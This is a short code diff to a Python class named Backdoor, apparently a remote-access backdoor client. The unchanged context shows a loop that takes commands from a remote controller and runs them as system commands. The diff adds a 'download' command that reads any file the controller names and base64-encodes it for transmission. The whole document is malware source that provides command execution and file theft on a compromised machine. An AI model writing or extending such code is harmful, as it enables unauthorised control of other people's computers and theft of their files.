@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 
 class Backdoor:
@@ -38,6 +39,10 @@ class Backdoor:
         except FileNotFoundError:
             return f'[-] Path {path} not found'
 
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())
+
     def run(self):
         while True:
             command = self.reliable_receive()  # str
@@ -47,6 +52,9 @@ class Backdoor:
             elif command[0] == 'cd' and len(command) > 1:
                 command_result = self.change_working_directory_to(
                     command[1])  # str
+            elif command[0] == 'download':
+                command_result = self.read_file(command[1])
+                command_result = command_result.decode()
             else:
                 command_result = self.execute_system_command(command)  # bytes
                 command_result = command_result.decode(errors='replace')  # str
